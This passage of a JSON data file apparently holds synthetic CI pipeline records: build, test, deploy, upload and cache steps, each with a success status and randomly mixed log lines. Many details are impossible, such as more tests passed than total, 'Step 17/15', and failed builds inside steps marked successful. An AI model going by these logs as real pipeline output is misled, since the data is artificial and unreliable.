          "Creating production build...",
          "Coverage: 83% statements, 76% branches",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 98",
          "Tests: 221 passed, 482 total",
          "Using Python 3.10",
          "Using Python 3.10",
          "Cache hit for key-8320",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "Environment: staging",
          "Compiling utils/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "Time: 71.455s",
          "Cache miss for key-5241",
          "Success!",
          "Already up to date.",
          "Already up to date.",
          "Artifact uploaded: dist.zip (82MB)",
          "Already up to date.",
          "Switched to branch 'feature/task-583'",
          "Ran 128 tests in 19s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Waiting...",
          "Fetching submodules...",
          "\u2713 Task completed in 1774ms",
          "Loading...",
          "Cache hit for key-2939",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:09] DEBUG: Connection pool: 6 active",
          "Bundling styles.js",
          "pip install: Successfully installed eslint-5.11",
          "Success!",
          "POST /data - 201 (226ms)",
          "Cache saved successfully",
          "[12:46:09] DEBUG: Memory usage: 862MB",
          "NODE_ENV=development",
          "Switched to branch 'bugfix/task-311'",
          "pip: Downloading jest-4.1.tar.gz",
          "\u2713 Step 'test' succeeded",
          "[12:46:09] INFO: Starting build process",
          "Verifying...",
          "Fetching submodules...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-20T12:46:44.025534",
        "finished_at": "2025-12-20T12:47:18.341293",
        "log_lines": [
          "=== Step: build ===",
          "Generating source maps...",
          "NODE_ENV=test",
          "Snapshots: 31 passed, 13 total",
          "Using Python 3.10",
          "Pulling image: python:18",
          "pip install: Successfully installed prettier-4.17",
          "\u2713 validate completed",
          "Completed.",
          "Using Node.js 16.9.0",
          "pip: Downloading eslint-1.3.tar.gz",
          "Cache restored successfully (14MB)",
          "[12:46:09] INFO: Request completed",
          "Checking out develop branch",
          "Pushing to registry...",
          "Step 10/15: Linting",
          "Cache saved successfully",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Step 17/15: Installing dependencies",
          "Switched to branch 'bugfix/task-677'",
          "[12:46:09] DEBUG: Memory usage: 712MB",
          "Cache restored successfully (138MB)",
          "npm install: added 13 packages",
          "Creating production build...",
          "Compiling src/handler.rs...",
          "[12:46:09] INFO: Cache refreshed",
          "\u2713 Task completed in 2441ms",
          "Cache miss for key-1108",
          "WARNING: react has known vulnerabilities",
          "Time: 56.638s",
          "npm notice: package.json updated",
          "Compiling utils/handler.rs...",
          "\u2717 build failed with exit code 93",
          "[12:46:09] INFO: Processing request",
          "npm notice: created a lockfile",
          "pip: Downloading eslint-1.0.tar.gz",
          "Step 3/17: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:09] ERROR: Connection failed",
          "Loading...",
          "  PASS: test_db_connect (136ms)",
          "Pushing to registry...",
          "  PASS: test_user_create (205ms)",
          "Snapshots: 22 passed, 9 total",
          "npm notice: package.json updated",
          "Compiling components/index.js...",
          "[12:46:09] INFO: Starting build process",
          "Cache hit for key-4209",
          "Transforming 685 files...",
          "Completed.",
          "Step 7/20: Running migrations",
          "Uploading artifact 'build' (28 files)",
          "Ran 85 tests in 21s",
          "Ran 78 tests in 30s",
          "Optimizing 28 modules...",
          "Cache miss for key-2203",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "\u2713 Step 'checkout' succeeded",
          "yarn add: Done in 25.36s",
          "Step 18/20: Deploying",
          "Step 15/17: Linting",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Ready.",
          "POST /data - 200 (438ms)",
          "Installing jest@3.0.8",
          "Waiting...",
          "Completed.",
          "Exception: RuntimeError",
          "Compiling utils/index.js...",
          "Waiting...",
          "Pushing to registry...",
          "WARNING: axios has known vulnerabilities",
          "Coverage: 97% statements, 85% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "  PASS: test_api_health (231ms)",
          "Switched to branch 'feature/task-357'",
          "Generating source maps...",
          "[12:46:09] INFO: Starting build process",
          "[12:46:09] DEBUG: Initializing service",
          "Pulling image: python:18",
          "WARNING: express has known vulnerabilities",
          "Cache saved successfully",
          "Optimizing 76 modules...",
          "Processing...",
          "[12:46:09] INFO: Connecting to database",
          "Time: 103.253s",
          "Verifying...",
          "Completed.",
          "npm notice: package.json updated",
          "Step 20/22: Testing",
          "Pushing to registry...",
          "Step 3/16: Running migrations",
          "GET /status - 204 (79ms)",
          "Environment: production",
          "Switched to branch 'bugfix/task-681'",
          "Image pulled successfully",
          "[12:46:09] WARN: Deprecated API usage",
          "Already up to date.",
          "[12:46:09] INFO: Starting build process",
          "Step 8/15: Building",
          "\u2713 All checks passed",
          "Loading...",
          "Bundling styles.css",
          "Cache hit for key-2057",
          "Compiling utils/handler.rs...",
          "\u2713 Task completed in 3698ms",
          "POST /api - 202 (202ms)",
          "npm notice: created a lockfile",
          "Layer 10/10: ENV command",
          "TLS handshake completed",
          "Cache restored successfully (365MB)",
          "Step 17/24: Running migrations",
          "npm notice: created a lockfile",
          "Pulling image: python:18",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:09] INFO: Cache refreshed",
          "Compiling lib/index.js...",
          "Artifact uploaded: dist.zip (89MB)",
          "Completed.",
          "Time: 68.697s",
          "Done.",
          "\u2713 lint completed",
          "\u2713 deploy completed",
          "Building Docker image...",
          "Done.",
          "yarn add: Done in 2.28s",
          "Loading...",
          "Using Python 3.11",
          "[12:46:09] DEBUG: Connection pool: 19 active",
          "Verifying...",
          "Time: 11.530s",
          "Coverage: 92% statements, 99% branches",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:46:09] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Cache restored successfully (370MB)",
          "Image pulled successfully",
          "Step 3/19: Running migrations",
          "Step 15/17: Deploying",
          "pip: Collecting webpack",
          "FAILED: test_db_connect",
          "Cache hit for key-8400",
          "npm install: added 129 packages",
          "Step 14/18: Running migrations",
          "\u2717 build failed with exit code 127",
          "Uploading artifact 'dist' (37 files)",
          "Layer 10/10: COPY command",
          "\u2713 Task completed in 3341ms",
          "[12:46:09] INFO: Processing request",
          "GET /api - 200 (85ms)",
          "[12:46:09] INFO: Cache refreshed",
          "Snapshots: 19 passed, 19 total",
          "Snapshots: 6 passed, 40 total",
          "[12:46:09] INFO: Processing request",
          "\u2713 build completed",
          "[12:46:09] DEBUG: Memory usage: 864MB",
          "Time: 16.325s",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-20T12:47:18.341293",
        "finished_at": "2025-12-20T12:47:41.218466",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:46:09] DEBUG: Loading configuration",
          "Image pulled successfully",
          "Time: 36.530s",
          "Verifying...",
          "Compiling lib/app.ts...",
          "[12:46:09] INFO: Processing request",
          "Cache restored successfully (14MB)",
          "Cache hit for key-9718",
          "[12:46:09] DEBUG: Initializing service",
          "Building Docker image...",
          "Fetching submodules...",
          "Cache hit for key-6790",
          "OK",
          "[12:46:09] DEBUG: Memory usage: 1549MB",
          "Pushing to registry...",
          "Compiling utils/handler.rs...",
          "GET /health - 201 (96ms)",
          "  PASS: unit/test_db_connect.spec.js",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Uploading artifact 'build' (18 files)",
          "Ready.",
          "Ran 161 tests in 53s",
          "npm install: resolved 1802 packages",
          "Artifact uploaded: dist.zip (60MB)",
          "\u2713 Step 'install' succeeded",
          "Compiling components/service.java...",
          "Exception: ValueError",
          "\u2717 build failed with exit code 72",
          "Test Suites: 36 passed, 16 total",
          "[12:46:09] DEBUG: Connection pool: 6 active",
          "Test Suites: 22 passed, 32 total",
          "pip: Collecting webpack",
          "Success!",
          "Already up to date.",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:09] INFO: Cache refreshed",
          "HEAD is now at bf9eb2f",
          "Checking out develop branch",
          "  PASS: unit/test_db_connect.spec.js",
          "Fetching submodules...",
          "Test Suites: 25 passed, 33 total",
          "npm install: resolved 316 packages",
          "Step 20/25: Testing",
          "\u2713 build completed",
          "[12:46:09] INFO: Request completed",
          "[12:46:09] DEBUG: Connection pool: 20 active",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "[12:46:09] DEBUG: Connection pool: 13 active",
          "Bundling vendor.js",
          "[12:46:09] INFO: Request completed",
          "Platform: darwin-arm64",
          "Tests: 467 passed, 266 total",
          "[12:46:09] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "\u2713 Task completed in 3037ms",
          "Completed.",
          "Coverage: 77% statements, 68% branches",
          "\u2713 All checks passed",
          "[12:46:09] INFO: Starting build process",
          "[12:46:09] ERROR: Connection failed",
          "Step 14/25: Building",
          "[12:46:09] WARN: Deprecated API usage",
          "Done.",
          "Processing...",
          "Processing...",
          "Tests: 141 passed, 271 total",
          "  PASS: test_db_connect (241ms)",
          "Step 14/20: Installing dependencies",
          "Transforming 861 files...",
          "Already up to date.",
          "[12:46:09] INFO: Processing request",
          "Using Node.js 14.0.10",
          "\u2713 Task completed in 3309ms",
          "npm install: resolved 1958 packages",
          "[12:46:09] INFO: Cache refreshed",
          "Cache invalidated: build",
          "Step 17/25: Deploying",
          "Artifact downloaded: 16MB",
          "FAILED: test_auth_login",
          "Fetching from https://docker.io/package.json",
          "Cache restored successfully (166MB)",
          "[12:46:09] DEBUG: Initializing service",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 All checks passed",
          "Ran 130 tests in 28s",
          "Ran 40 tests in 54s",
          "Exception: TypeError",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: dist.zip (16MB)",
          "NODE_ENV=test",
          "Cache hit for key-7387",
          "yarn add: Done in 14.69s",
          "Optimizing 12 modules...",
          "Ready.",
          "[12:46:09] DEBUG: Loading configuration",
          "Compiling lib/service.java...",
          "Connection established",
          "Waiting...",
          "\u2713 validate completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 Step 'test' succeeded",
          "Exception: NullPointerException",
          "pip: Installing build dependencies...",
          "OK",
          "Connection established",
          "[12:46:09] INFO: Starting build process",
          "[12:46:09] WARN: Deprecated API usage",
          "Already up to date.",
          "[12:46:09] INFO: Processing request",
          "pip: Downloading express-1.9.tar.gz",
          "Cache invalidated: node_modules",
          "WARNING: webpack has known vulnerabilities",
          "Uploading artifact 'coverage' (44 files)",
          "Snapshots: 29 passed, 28 total",
          "TLS handshake completed",
          "Success!",
          "Compiling lib/app.ts...",
          "Snapshots: 46 passed, 22 total",
          "Waiting...",
          "Generating source maps...",
          "Waiting...",
          "Cache invalidated: node_modules",
          "Step 8/18: Linting",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-343'",
          "  PASS: integration/test_api_health.spec.js",
          "Snapshots: 49 passed, 32 total",
          "npm install: added 275 packages",
          "WARNING: express has known vulnerabilities",
          "npm notice: created a lockfile",
          "[12:46:09] INFO: Starting build process",
          "  PASS: test_api_health (106ms)",
          "Building Docker image...",
          "Platform: darwin-arm64",
          "Environment: test",
          "Coverage: 89% statements, 98% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/service.java...",
          "[12:46:09] INFO: Cache refreshed",
          "[12:46:09] DEBUG: Memory usage: 448MB",
          "WARNING: eslint has known vulnerabilities",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 173 tests in 52s",
          "TLS handshake completed",
          "Bundling main.js",
          "Cache miss for key-5218",
          "[12:46:09] DEBUG: Initializing service",
          "Tests: 397 passed, 71 total",
          "Exception: NullPointerException",
          "Compiling lib/app.ts...",
          "Bundling styles.css",
          "WARNING: prettier has known vulnerabilities",
          "Step 12/15: Building",
          "FAILED: test_cache_hit",
          "Compiling src/main.py...",
          "Test Suites: 50 passed, 28 total",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-20T12:47:41.218466",
        "finished_at": "2025-12-20T12:47:52.657052",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "GET /status - 201 (17ms)",
          "Compiling lib/service.java...",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-1650",
          "[12:46:09] INFO: Processing request",
          "Step 13/16: Deploying",
          "Coverage: 88% statements, 90% branches",
          "Compiling lib/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Step 'setup' succeeded",
          "Fetching submodules...",
          "GET /status - 201 (67ms)",
          "Switched to branch 'feature/task-470'",
          "Test Suites: 22 passed, 15 total",
          "[12:46:09] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "NODE_ENV=production",
          "[12:46:09] INFO: Request completed",
          "  PASS: test_auth_login (479ms)",
          "Bundling main.css",
          "Tests: 415 passed, 439 total",
          "Loading...",
          "WARNING: react has known vulnerabilities",
          "Snapshots: 26 passed, 46 total",
          "[12:46:09] DEBUG: Initializing service",
          "[12:46:09] WARN: Deprecated API usage",
          "Transforming 768 files...",
          "Checking out develop branch",
          "Minifying app.js",
          "Cache invalidated: build",
          "Verifying...",
          "Using Python 3.9",
          "yarn add: Done in 9.58s",
          "Pushing to registry...",
          "Cache saved successfully",
          "\u2717 build failed with exit code 43",
          "Creating production build...",
          "  PASS: unit/test_user_create.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Snapshots: 35 passed, 10 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:09] WARN: Deprecated API usage",
          "Compiling components/handler.rs...",
          "Using Node.js 18.16.7",
          "[12:46:09] DEBUG: Initializing service",
          "npm install: resolved 1948 packages",
          "Step 13/16: Running migrations",
          "[12:46:09] DEBUG: Connection pool: 20 active",
          "Environment: staging",
          "HEAD is now at c863490",
          "Tests: 233 passed, 107 total",
          "Cache saved successfully",
          "Ran 167 tests in 44s",
          "Finished.",
          "[12:46:09] INFO: Request completed",
          "Compiling src/handler.rs...",
          "Cache restored successfully (342MB)",
          "[12:46:09] DEBUG: Initializing service",
          "Optimizing 89 modules...",
          "Step 12/16: Installing dependencies",
          "Uploading artifact 'coverage' (3 files)",
          "Cache restored successfully (19MB)",
          "Success!",
          "Finished.",
          "Artifact uploaded: dist.zip (7MB)",
          "POST /data - 202 (335ms)",
          "Checking out develop branch",
          "[12:46:09] INFO: Cache refreshed",
          "\u2717 build failed with exit code 106",
          "[12:46:09] INFO: Starting build process",
          "Tests: 167 passed, 73 total",
          "Tests: 167 passed, 65 total",
          "Switched to branch 'hotfix/task-286'",
          "Verifying...",
          "TLS handshake completed",
          "Coverage: 85% statements, 64% branches",
          "Building Docker image...",
          "Compiling components/index.js...",
          "Step 9/21: Installing dependencies",
          "Step 4/24: Deploying",
          "\u2713 Task completed in 2223ms",
          "Installing react@3.12.1",
          "WARNING: prettier has known vulnerabilities",
          "yarn add: Done in 8.21s",
          "Compiling src/app.ts...",
          "Success!",
          "Switched to branch 'feature/task-168'",
          "pip: Installing build dependencies...",
          "WARNING: webpack has known vulnerabilities",
          "Cache miss for key-3779",
          "Cache miss for key-5875",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:09] INFO: Connecting to database",
          "[12:46:09] INFO: Connecting to database",
          "Completed.",
          "Ready.",
          "[12:46:09] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "HEAD is now at b98fc15",
          "POST /upload - 201 (351ms)",
          "[12:46:09] INFO: Processing request",
          "Waiting...",
          "\u2713 build completed",
          "Minifying vendor.js",
          "Minifying main.js",
          "[12:46:09] DEBUG: Query executed in 94ms",
          "Installing express@3.9.7",
          "[12:46:09] INFO: Processing request",
          "Pulling image: alpine:3.11",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "Compiling src/service.java...",
          "[12:46:09] DEBUG: Memory usage: 882MB",
          "Time: 112.992s",
          "Done.",
          "Environment: development",
          "Using Node.js 20.5.1",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache miss for key-2084",
          "FAILED: test_auth_login",
          "Cache saved successfully",
          "Connection established",
          "Fetching submodules...",
          "Image pulled successfully",
          "Using Node.js 15.18.4",
          "POST /data - 201 (500ms)",
          "Cache restored successfully (133MB)",
          "Using Node.js 17.17.4",
          "Switched to branch 'bugfix/task-292'",
          "Step 6/22: Installing dependencies",
          "Test Suites: 34 passed, 48 total",
          "npm notice: created a lockfile",
          "[12:46:09] INFO: Starting build process",
          "[12:46:09] WARN: Deprecated API usage",
          "Layer 5/10: ENV command",
          "[12:46:09] INFO: Starting build process",
          "POST /api - 202 (449ms)",
          "[12:46:09] INFO: Request completed",
          "NODE_ENV=development",
          "Test Suites: 50 passed, 38 total",
          "[12:46:09] INFO: Processing request",
          "[12:46:09] WARN: Deprecated API usage",
          "Coverage: 84% statements, 91% branches",
          "npm install: added 470 packages",
          "Step 4/22: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 17/17: Linting",
          "npm notice: package.json updated",
          "[12:46:09] WARN: Deprecated API usage",
          "Step 4/23: Linting",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "Checking out main branch",
          "NODE_ENV=production",
          "[12:46:09] INFO: Connecting to database",
          "Ready.",
          "[12:46:09] DEBUG: Initializing service",
          "[12:46:09] INFO: Cache refreshed",
          "[12:46:09] INFO: Processing request",
          "[12:46:09] INFO: Starting build process",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-20T12:47:52.657052",
        "finished_at": "2025-12-20T12:48:04.095638",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 build completed",
          "Building Docker image...",
          "[12:46:09] DEBUG: Query executed in 42ms",
          "Environment: development",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Optimizing 70 modules...",
          "[12:46:09] DEBUG: Memory usage: 1304MB",
          "\u2713 Task completed in 3191ms",
          "Step 4/23: Linting",
          "Checking out master branch",
          "[12:46:09] INFO: Connecting to database",
          "[12:46:09] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "Layer 6/12: RUN command",
          "[12:46:09] DEBUG: Connection pool: 17 active",
          "Coverage: 80% statements, 92% branches",
          "pip: Downloading prettier-5.8.tar.gz",
          "Step 8/19: Installing dependencies",
          "Step 16/17: Installing dependencies",
          "Step 7/19: Testing",
          "NODE_ENV=production",
          "Connection established",
          "Compiling components/app.ts...",
          "Ran 85 tests in 37s",
          "  PASS: unit/test_cache_hit.spec.js",
          "Compiling src/main.py...",
          "Optimizing 34 modules...",
          "\u2713 build completed",
          "pip: Downloading lodash-3.18.tar.gz",
          "[12:46:09] WARN: Deprecated API usage",
          "Optimizing 98 modules...",
          "Completed.",
          "npm install: added 430 packages",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:46:09] INFO: Cache refreshed",
          "Processing...",
          "Step 14/22: Deploying",
          "npm install: resolved 377 packages",
          "Compiling utils/main.py...",
          "[12:46:09] INFO: Starting build process",
          "OK",
          "[12:46:09] INFO: Starting build process",
          "Compiling lib/utils.go...",
          "[12:46:09] ERROR: Connection failed",
          "\u2713 Step 'build' succeeded",
          "Platform: win32-x64",
          "POST /api - 202 (451ms)",
          "Building Docker image...",
          "  PASS: test_auth_login (443ms)",
          "pip install: Successfully installed react-1.17",
          "Finished.",
          "Ready.",
          "[12:46:09] INFO: Request completed",
          "[12:46:09] WARN: Deprecated API usage",
          "Fetching submodules...",
          "OK",
          "Platform: linux-x64",
          "Cache hit for key-9096",
          "Verifying...",
          "Artifact uploaded: dist.zip (31MB)",
          "Cache hit for key-4080",
          "Using Node.js 16.1.7",
          "Pulling image: alpine:18",
          "Checking out master branch",
          "Verifying...",
          "\u2713 Step 'build' succeeded",
          "[12:46:09] DEBUG: Loading configuration",
          "Pulling image: alpine:18",
          "POST /api - 200 (191ms)",
          "Compiling src/index.js...",
          "npm install: added 377 packages",
          "Artifact downloaded: 43MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Image pulled successfully",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: added 31 packages",
          "NODE_ENV=development",
          "pip install: Successfully installed react-2.4",
          "Generating source maps...",
          "npm notice: package.json updated",
          "[12:46:09] DEBUG: Memory usage: 1965MB",
          "yarn add: Done in 6.44s",
          "Minifying app.js",
          "[12:46:09] ERROR: Connection failed",
          "npm install: resolved 1735 packages",
          "Coverage: 91% statements, 93% branches",
          "Test Suites: 35 passed, 39 total",
          "HEAD is now at ab56088",
          "Using Python 3.12",
          "Environment: test",
          "Ready.",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 16",
          "Test Suites: 10 passed, 15 total",
          "Cache restored successfully (311MB)",
          "\u2713 All checks passed",
          "Minifying app.js",
          "Creating production build...",
          "Step 15/23: Installing dependencies",
          "  PASS: integration/test_auth_login.spec.js",
          "GET /health - 204 (67ms)",
          "Tests: 50 passed, 82 total",
          "[12:46:09] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "npm install: resolved 526 packages",
          "[12:46:09] INFO: Request completed",
          "TLS handshake completed",
          "\u2713 package completed",
          "yarn add: Done in 13.5s",
          "pip: Downloading lodash-3.11.tar.gz",
          "Pushing to registry...",
          "Compiling lib/service.java...",
          "Using Node.js 15.1.0",
          "Processing...",
          "WARNING: lodash has known vulnerabilities",
          "Compiling lib/utils.go...",
          "OK",
          "Step 8/17: Running migrations",
          "[12:46:09] INFO: Request completed",
          "pip: Downloading eslint-2.8.tar.gz",
          "Done.",
          "Exception: NullPointerException",
          "Waiting...",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Layer 10/9: COPY command",
          "Exception: NullPointerException",
          "Loading...",
          "Environment: staging",
          "Step 3/22: Deploying",
          "[12:46:09] INFO: Connecting to database",
          "Snapshots: 48 passed, 19 total",
          "Time: 22.453s",
          "Artifact downloaded: 25MB",
          "\u2713 Step 'checkout' succeeded",
          "Checking out main branch",
          "Switched to branch 'bugfix/task-404'",
          "Coverage: 72% statements, 91% branches",
          "Compiling components/app.ts...",
          "Snapshots: 33 passed, 10 total",
          "Checking out develop branch",
          "Artifact downloaded: 5MB",
          "[12:46:09] INFO: Connecting to database",
          "Coverage: 85% statements, 80% branches",
          "[12:46:09] DEBUG: Loading configuration",
          "Ran 125 tests in 51s",
          "Step 13/20: Running migrations",
          "Success!",
          "Layer 2/14: COPY command",
          "WARNING: webpack has known vulnerabilities",
          "POST /upload - 201 (309ms)",
          "[12:46:09] WARN: Deprecated API usage",
          "Cache invalidated: dependencies",
          "Bundling runtime.js",
          "Step 13/22: Running migrations",
          "Completed.",
          "npm install: added 68 packages",
          "Step 11/23: Deploying",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-20T12:48:04.095638",
        "finished_at": "2025-12-20T12:48:10.958790",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Processing...",
          "Success!",
          "Artifact downloaded: 47MB",
          "Pulling image: alpine:3.11",
          "Compiling src/app.ts...",
          "HEAD is now at 0213dd8",
          "pip: Downloading prettier-2.20.tar.gz",
          "[12:46:09] DEBUG: Memory usage: 1787MB",
          "Image pulled successfully",
          "yarn add: Done in 10.7s",
          "Already up to date.",
          "Compiling src/utils.go...",
          "[12:46:09] INFO: Processing request",
          "Coverage: 84% statements, 65% branches",
          "Cache miss for key-7440",
          "[12:46:09] INFO: Processing request",
          "[12:46:09] DEBUG: Loading configuration",
          "Compiling utils/handler.rs...",
          "Time: 107.557s",
          "[12:46:09] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Test Suites: 6 passed, 36 total",
          "pip: Downloading react-2.7.tar.gz",
          "Cache miss for key-3065",
          "Cache miss for key-8305",
          "Step 5/22: Installing dependencies",
          "Using Node.js 20.12.7",
          "\u2713 Task completed in 2344ms",
          "Connection established",
          "[12:46:09] DEBUG: Memory usage: 328MB",
          "\u2713 Task completed in 4202ms",
          "Processing...",
          "[12:46:09] INFO: Request completed",
          "npm notice: created a lockfile",
          "Exception: RuntimeError",
          "WARNING: express has known vulnerabilities",
          "[12:46:09] INFO: Starting build process",
          "Image pulled successfully",
          "Step 3/21: Linting",
          "\u2713 build completed",
          "Fetching from https://github.com/package.json",
          "GET /api - 201 (93ms)",
          "Step 3/22: Installing dependencies",
          "Building Docker image...",
          "npm notice: package.json updated",
          "[12:46:09] INFO: Processing request",
          "npm install: resolved 1759 packages",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache invalidated: dependencies",
          "[12:46:09] DEBUG: Connection pool: 13 active",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "[12:46:09] INFO: Processing request",
          "Ready.",
          "Artifact downloaded: 36MB",
          "[12:46:09] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Checking out develop branch",
          "[12:46:09] INFO: Processing request",
          "Done.",
          "[12:46:09] INFO: Cache refreshed",
          "[12:46:09] INFO: Processing request",
          "Generating source maps...",
          "[12:46:09] DEBUG: Query executed in 56ms",
          "Done.",
          "Using Node.js 20.10.9",
          "Artifact downloaded: 17MB",
          "Generating source maps...",
          "Cache restored successfully (499MB)",
          "Building Docker image...",
          "Compiling utils/main.py...",
          "[12:46:09] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (7 files)",
          "HEAD is now at 91b0356",
          "Artifact downloaded: 27MB",
          "Cache hit for key-4048",
          "Step 10/16: Linting",
          "Image pulled successfully",
          "[12:46:09] WARN: Deprecated API usage",
          "Connection established",
          "Step 8/23: Deploying",
          "Checking out main branch",
          "Transforming 762 files...",
          "[12:46:09] DEBUG: Initializing service",
          "Processing...",
          "Step 14/24: Installing dependencies",
          "Time: 36.793s",
          "Pulling image: alpine:18",
          "HEAD is now at 083a1d4",
          "[12:46:09] DEBUG: Memory usage: 722MB",
          "FAILED: test_cache_hit",
          "[12:46:09] DEBUG: Loading configuration",
          "Completed.",
          "Completed.",
          "Step 3/17: Linting",
          "[12:46:09] ERROR: Connection failed",
          "Using Node.js 17.8.3",
          "Building Docker image...",
          "\u2713 Task completed in 1376ms",
          "[12:46:09] ERROR: Connection failed",
          "Cache miss for key-1744",
          "Artifact uploaded: dist.zip (76MB)",
          "Generating source maps...",
          "Step 1/22: Testing",
          "Artifact downloaded: 8MB",
          "POST /upload - 200 (226ms)",
          "npm install: added 74 packages",
          "Compiling components/app.ts...",
          "Test Suites: 29 passed, 40 total",
          "[12:46:09] INFO: Cache refreshed",
          "  PASS: test_db_connect (437ms)",
          "[12:46:09] DEBUG: Connection pool: 6 active",
          "pip: Installing build dependencies...",
          "HEAD is now at c189ca2",
          "Verifying...",
          "[12:46:09] INFO: Connecting to database",
          "Finished.",
          "[12:46:09] INFO: Connecting to database",
          "[12:46:09] DEBUG: Query executed in 55ms",
          "Done.",
          "  PASS: e2e/test_user_create.spec.js",
          "Connection established",
          "Transforming 668 files...",
          "Already up to date.",
          "Step 14/16: Installing dependencies",
          "[12:46:09] DEBUG: Initializing service",
          "\u2713 build completed",
          "FAILED: test_api_health",
          "Environment: production",
          "\u2713 validate completed",
          "Waiting...",
          "Fetching from https://docker.io/package.json",
          "[12:46:09] DEBUG: Memory usage: 660MB",
          "[12:46:09] INFO: Connecting to database",
          "Using Python 3.10",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:09] DEBUG: Initializing service",
          "Finished.",
          "Artifact downloaded: 40MB",
          "Fetching from https://gcr.io/package.json",
          "Installing jest@1.4.0",
          "Uploading artifact 'dist' (6 files)",
          "Step 17/21: Running migrations",
          "Transforming 808 files...",
          "Image pulled successfully",
          "Step 7/18: Testing",
          "pip: Collecting lodash",
          "Finished.",
          "[12:46:09] INFO: Connecting to database",
          "Compiling utils/index.js...",
          "WARNING: express has known vulnerabilities",
          "Cache miss for key-3971",
          "Bundling main.css",
          "Snapshots: 43 passed, 18 total",
          "Step 15/17: Running migrations",
          "[12:46:09] DEBUG: Memory usage: 803MB",
          "Finished.",
          "[12:46:09] INFO: Processing request",
          "pip install: Successfully installed lodash-4.7",
          "Step 7/22: Deploying",
          "Compiling utils/main.py...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-20T12:48:10.958790",
        "finished_at": "2025-12-20T12:48:45.274549",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Cache restored successfully (92MB)",
          "[12:46:09] INFO: Processing request",
          "Optimizing 85 modules...",
          "NODE_ENV=development",
          "\u2713 validate completed",
          "[12:46:09] INFO: Connecting to database",
          "npm notice: package.json updated",
          "[12:46:09] DEBUG: Memory usage: 1958MB",
          "WARNING: eslint has known vulnerabilities",
          "npm install: added 418 packages",
          "Step 10/16: Installing dependencies",
          "\u2713 build completed",
          "[12:46:09] ERROR: Connection failed",
          "Ran 46 tests in 22s",
          "Waiting...",
          "Ran 12 tests in 31s",
          "[12:46:09] WARN: Deprecated API usage",
          "Compiling utils/index.js...",
          "Creating production build...",
          "Step 17/17: Testing",
          "Step 1/16: Deploying",
          "Artifact downloaded: 33MB",
          "GET /api - 201 (30ms)",
          "[12:46:09] DEBUG: Memory usage: 942MB",
          "Platform: darwin-arm64",
          "[12:46:09] DEBUG: Connection pool: 9 active",
          "Optimizing 83 modules...",
          "Layer 9/8: COPY command",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:46:09] INFO: Connecting to database",
